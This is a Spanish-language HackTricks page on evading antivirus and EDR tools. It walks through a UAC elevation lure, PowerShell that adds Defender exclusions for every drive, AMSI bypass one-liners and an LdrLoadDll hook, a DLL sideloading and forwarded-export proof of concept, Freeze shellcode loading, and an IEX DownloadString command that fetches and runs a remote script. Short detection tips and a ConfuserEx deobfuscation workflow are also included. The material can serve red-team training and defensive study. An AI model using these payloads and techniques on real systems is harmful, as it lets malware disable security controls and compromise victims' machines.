# Evasión de Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página fue escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para evitar que Windows Defender funcione.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para detener Windows Defender haciéndose pasar por otro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Cebo de UAC estilo instalador antes de manipular Defender

Los loaders públicos que se hacen pasar por cheats de juegos con frecuencia se distribuyen como instaladores Node.js/Nexe sin firmar que primero **piden elevación al usuario** y solo entonces neutralizan Defender. El flujo es simple:

1. Comprobar el contexto administrativo con `net session`. El comando solo tiene éxito cuando el llamador posee privilegios de administrador, por lo que un fallo indica que el loader se está ejecutando como usuario estándar.
2. Relanzarse inmediatamente con el verbo `RunAs` para desencadenar el esperado prompt de consentimiento de UAC mientras preserva la línea de comandos original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Las víctimas ya creen que están instalando software “cracked”, por lo que normalmente aceptan el aviso, lo que le otorga al malware los permisos que necesita para cambiar la política de Defender.

### Exclusiones generales `MpPreference` para cada letra de unidad

Una vez elevados, las cadenas estilo GachiLoader maximizan los puntos ciegos de Defender en lugar de deshabilitar el servicio por completo. El loader primero mata el watchdog de la GUI (`taskkill /F /IM SecHealthUI.exe`) y luego aplica **exclusiones extremadamente amplias** para que cada perfil de usuario, directorio del sistema y disco extraíble no puedan ser escaneados:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observaciones clave:

- El bucle recorre todos los sistemas de archivos montados (D:\, E:\, USB sticks, etc.) por lo que **cualquier payload futuro dejado en cualquier lugar del disco es ignorado**.
- La exclusión de la extensión `.sys` es prospectiva—los atacantes se reservan la opción de cargar drivers sin firmar más tarde sin volver a tocar Defender.
- Todos los cambios se registran bajo `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitiendo que etapas posteriores confirmen que las exclusiones persisten o las amplíen sin volver a desencadenar UAC.

Como no se detiene ningún servicio de Defender, las comprobaciones de salud ingenuas siguen reportando “antivirus activo” aunque la inspección en tiempo real nunca toque esas rutas.

## **AV Evasion Methodology**

Actualmente, los AVs usan distintos métodos para comprobar si un archivo es malicioso o no: static detection, dynamic analysis y, para los EDRs más avanzados, behavioural analysis.

### **Static detection**

La detección estática se logra marcando cadenas conocidas maliciosas o arrays de bytes en un binario o script, y también extrayendo información del propio archivo (p. ej. file description, company name, digital signatures, icon, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te detecten más fácilmente, ya que probablemente ya han sido analizadas y marcadas como maliciosas. Hay un par de maneras de sortear este tipo de detección:

- **Encryption**

Si encriptas el binario, no habrá forma para que el AV detecte tu programa, pero necesitarás algún tipo de loader para desencriptar y ejecutar el programa en memoria.

- **Obfuscation**

A veces todo lo que necesitas es cambiar algunas cadenas en tu binario o script para pasar el AV, pero esto puede ser una tarea que consume tiempo dependiendo de lo que intentes ofuscar.

- **Custom tooling**

Si desarrollas tus propias herramientas, no habrá firmas conocidas malas, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Te recomiendo mucho revisar este [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre evasión práctica de AV.

### **Dynamic analysis**

La dynamic analysis es cuando el AV ejecuta tu binario en una sandbox y observa actividad maliciosa (p. ej. intentar desencriptar y leer las contraseñas del navegador, hacer un minidump de LSASS, etc.). Esta parte puede ser más complicada de manejar, pero aquí tienes algunas cosas que puedes hacer para evadir sandboxes.

- **Sleep before execution** Dependiendo de cómo esté implementado, puede ser una gran forma de bypass para la dynamic analysis de los AVs. Los AVs tienen muy poco tiempo para escanear archivos para no interrumpir el flujo de trabajo del usuario, así que usar sleeps largos puede perjudicar el análisis de binarios. El problema es que muchas sandboxes de AVs pueden simplemente saltarse el sleep dependiendo de cómo esté implementado.
- **Checking machine's resources** Normalmente las sandboxes tienen muy pocos recursos con los que trabajar (p. ej. < 2GB RAM), de lo contrario podrían ralentizar la máquina del usuario. También puedes ser muy creativo aquí, por ejemplo comprobando la temperatura de la CPU o incluso la velocidad de los ventiladores; no todo estará implementado en la sandbox.
- **Machine-specific checks** Si quieres atacar a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes comprobar el dominio del equipo para ver si coincide con el que has especificado; si no coincide, puedes hacer que tu programa termine.

Resulta que el nombre del equipo de la Sandbox de Microsoft Defender es HAL9TH, así que puedes comprobar el nombre del equipo en tu malware antes de la detonación; si el nombre coincide con HAL9TH, significa que estás dentro de la sandbox de Defender, por lo que puedes hacer que tu programa salga.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algunos otros consejos muy buenos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como hemos dicho antes en este post, las **herramientas públicas** acabarán **siendo detectadas**, así que deberías hacerte una pregunta:

Por ejemplo, si quieres dump LSASS, ¿**realmente necesitas usar mimikatz**? ¿O podrías usar otro proyecto menos conocido que también haga dumps de LSASS?

La respuesta correcta probablemente sea la última. Tomando mimikatz como ejemplo, probablemente sea uno de, si no el más, detectado por AVs y EDRs; aunque el proyecto sea genial, también es una pesadilla trabajar con él para sortear AVs, así que busca alternativas para lo que intentas lograr.

> [!TIP]
> Cuando modifiques tus payloads para evasión, asegúrate de **desactivar el envío automático de muestras** en Defender, y por favor, en serio, **NO SUBAS A VIRUSTOTAL** si tu objetivo es lograr evasión a largo plazo. Si quieres comprobar si tu payload es detectado por un AV en particular, instálalo en una VM, intenta desactivar el envío automático de muestras y pruébalo allí hasta que estés satisfecho con el resultado.

## EXEs vs DLLs

Siempre que sea posible, **prioriza usar DLLs para evasión**, en mi experiencia, los archivos DLL suelen ser **mucho menos detectados** y analizados, por lo que es un truco muy simple para evitar detección en algunos casos (si tu payload tiene alguna forma de ejecutarse como DLL, por supuesto).

Como podemos ver en esta imagen, un DLL Payload de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el payload EXE tiene una tasa de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## DLL Sideloading & Proxying

**DLL Sideloading** aprovecha el DLL search order usado por el loader posicionando tanto la aplicación víctima como los payload(s) maliciosos uno al lado del otro.

Puedes comprobar programas susceptibles a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) y el siguiente powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Te recomiendo encarecidamente que **explores los programas DLL Hijackable/Sideloadable por tu cuenta**, esta técnica es bastante sigilosa si se realiza correctamente, pero si utilizas programas DLL Sideloadable de conocimiento público, puedes ser descubierto fácilmente.

El simple hecho de colocar un DLL malicioso con el nombre que un programa espera cargar no cargará tu payload, ya que el programa espera funciones específicas dentro de ese DLL; para solucionar este problema, usaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía las llamadas que hace un programa desde el DLL proxy (y malicioso) al DLL original, preservando así la funcionalidad del programa y permitiendo manejar la ejecución de tu payload.

Usaré el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una plantilla de código fuente de DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estos son los resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Te recomiendo encarecidamente que veas [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también [el video de ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender más en profundidad sobre lo que hemos tratado.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` no es un KnownDLL, por lo que se resuelve mediante el orden de búsqueda normal.

PoC (copiar/pegar):
1) Copiar la DLL del sistema firmada a una carpeta con permisos de escritura
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca una `NCRYPTPROV.dll` maliciosa en la misma carpeta. Un DllMain mínimo es suficiente para obtener code execution; no necesitas implementar la función reenviada para activar DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Activar el reenvío con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- While resolving `KeyIsoSetAuditingInterface`, the loader follows the forward to `NCRYPTPROV.SetAuditingInterface`
- The loader then loads `NCRYPTPROV.dll` from `C:\test` and executes its `DllMain`
- If `SetAuditingInterface` is not implemented, you'll get a "missing API" error only after `DllMain` has already run

Hunting tips:
- Céntrate en los forwarded exports donde el módulo objetivo no sea un KnownDLL. KnownDLLs están listados bajo `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puedes enumerar los forwarded exports con herramientas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitorea LOLBins (p. ej., rundll32.exe) que carguen DLLs firmadas desde rutas no del sistema, seguidas de la carga de non-KnownDLLs con el mismo nombre base desde ese directorio
- Alerta sobre cadenas de proceso/módulo como: `rundll32.exe` → `keyiso.dll` (no del sistema) → `NCRYPTPROV.dll` en rutas escribibles por el usuario
- Implementa políticas de integridad de código (WDAC/AppLocker) y evita write+execute en directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puedes usar Freeze para cargar y ejecutar tu shellcode de forma sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es solo un juego del gato y el ratón; lo que funciona hoy puede detectarse mañana, así que nunca confíes en una sola herramienta; si es posible, intenta encadenar múltiples técnicas de evasión.

## AMSI (Anti-Malware Scan Interface)

AMSI se creó para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AV solo podían escanear **files on disk**, por lo que si de alguna forma podías ejecutar payloads directamente in-memory, el AV no podía hacer nada para evitarlo, ya que no tenía suficiente visibilidad.

La característica AMSI está integrada en estos componentes de Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Permite a las soluciones antivirus inspeccionar el comportamiento de scripts exponiendo el contenido de los scripts en una forma que no está ni encriptada ni unobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Fíjate cómo antepone `amsi:` y luego la ruta al ejecutable desde el que se ejecutó el script, en este caso, powershell.exe

No dejamos ningún archivo en disco, pero aun así fuimos detectados in-memory debido a AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bastó una línea de código powershell para dejar AMSI inutilizable para el proceso actual de powershell. Esa línea, por supuesto, fue detectada por AMSI, así que se necesita modificarla para poder usar esta técnica.

Aquí hay un bypass de AMSI modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Ten en cuenta que esto probablemente será detectado cuando se publique este artículo, por lo que no deberías publicar ningún código si tu objetivo es permanecer indetectado.

**Memory Patching**

Esta técnica fue inicialmente descubierta por [@RastaMouse](https://twitter.com/_RastaMouse/) y consiste en localizar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada proporcionada por el usuario) y sobrescribirla con instrucciones que devuelven el código E_INVALIDARG; de esta manera, el resultado del escaneo real será 0, lo que se interpreta como un resultado limpio.

> [!TIP]
> Por favor, lea [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.

También existen muchas otras técnicas para evadir AMSI con powershell; consulta [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) y [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender más sobre ellas.

### Bloqueando AMSI evitando la carga de amsi.dll (LdrLoadDll hook)

AMSI se inicializa sólo después de que `amsi.dll` se carga en el proceso actual. Un bypass robusto e independiente del lenguaje consiste en colocar un hook en modo usuario sobre `ntdll!LdrLoadDll` que devuelve un error cuando el módulo solicitado es `amsi.dll`. Como resultado, AMSI nunca se carga y no se realizan escaneos para ese proceso.

Esquema de implementación (pseudocódigo x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Funciona en PowerShell, WScript/CScript y custom loaders por igual (cualquier cosa que de otro modo cargaría AMSI).
- Combínalo con alimentar scripts por stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefactos largos en la línea de comandos.
- Visto usado por loaders ejecutados a través de LOLBins (p. ej., `regsvr32` llamando a `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Eliminar la firma detectada**

Puedes usar una herramienta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la firma AMSI detectada de la memoria del proceso actual. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la firma AMSI y luego sobrescribiéndola con instrucciones NOP, eliminándola efectivamente de la memoria.

**Productos AV/EDR que usan AMSI**

Puedes encontrar una lista de productos AV/EDR que usan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usar PowerShell versión 2**
Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin que AMSI los escanee. Puedes hacer esto:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging es una característica que permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para auditoría y resolución de problemas, pero también puede ser un **problema para atacantes que quieren evadir la detección**.

Para evadir PowerShell logging, puedes usar las siguientes técnicas:

- **Disable PowerShell Transcription and Module Logging**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Use Powershell version 2**: Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin que AMSI los escanee. Puedes hacerlo: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para spawnear un powershell sin defensas (esto es lo que `powerpick` de Cobal Strike usa).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Al analizar malware que usa ConfuserEx 2 (o forks comerciales) es común encontrarse con varias capas de protección que bloquearán descompiladores y sandboxes. El flujo de trabajo que sigue restaura de forma fiable un **IL casi original** que después puede ser decompilado a C# en herramientas como dnSpy o ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La salida contiene los 6 parámetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que pueden ser útiles al construir tu propio unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Después de este paso deberías observar APIs normales de .NET como `Convert.FromBase64String` o `AES.Create()` en lugar de funciones wrapper opacas (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin** necesidad de ejecutar la muestra maliciosa — útil cuando se trabaja en una estación de trabajo offline.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Ofuscador para C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto del conjunto de compilación [LLVM](http://www.llvm.org/) capaz de aumentar la seguridad del software mediante [ofuscación de código](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y protección contra manipulaciones.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin usar herramientas externas y sin modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de operaciones ofuscadas generadas por el framework de metaprogramación de plantillas de C++, lo que dificultará un poco la tarea de quien quiera romper la aplicación.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador de binarios x64 capaz de ofuscar varios tipos de archivos PE, incluyendo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un motor simple de código metamórfico para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un framework de ofuscación de código de grano fino para lenguajes soportados por LLVM que utiliza ROP (return-oriented programming). ROPfuscator ofusca un programa a nivel de código ensamblador transformando instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un Crypter de PE .NET escrito en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor puede convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobando el ADS Zone.Identifier de un archivo descargado de internet.</p></figcaption></figure>

> [!TIP]
> Es importante notar que los ejecutables firmados con un certificado de firma **confiable** **no activarán SmartScreen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aquí hay una demo para evadir SmartScreen empaquetando payloads dentro de archivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un potente mecanismo de registro en Windows que permite a las aplicaciones y componentes del sistema **registrar eventos**. Sin embargo, también puede ser usado por productos de seguridad para monitorizar y detectar actividades maliciosas.

De manera similar a cómo AMSI se desactiva (bypassed), también es posible hacer que la función **`EtwEventWrite`** del proceso en espacio de usuario retorne inmediatamente sin registrar ningún evento. Esto se hace parcheando la función en memoria para que retorne inmediatamente, deshabilitando efectivamente el registro ETW para ese proceso.

Puedes encontrar más info en **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Cargar binarios C# en memoria es conocido desde hace tiempo y sigue siendo una excelente forma de ejecutar tus herramientas de post-exploitation sin ser detectado por AV.

Dado que el payload se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.

La mayoría de frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya permiten ejecutar ensamblados C# directamente en memoria, pero hay diferentes maneras de hacerlo:

- **Fork\&Run**

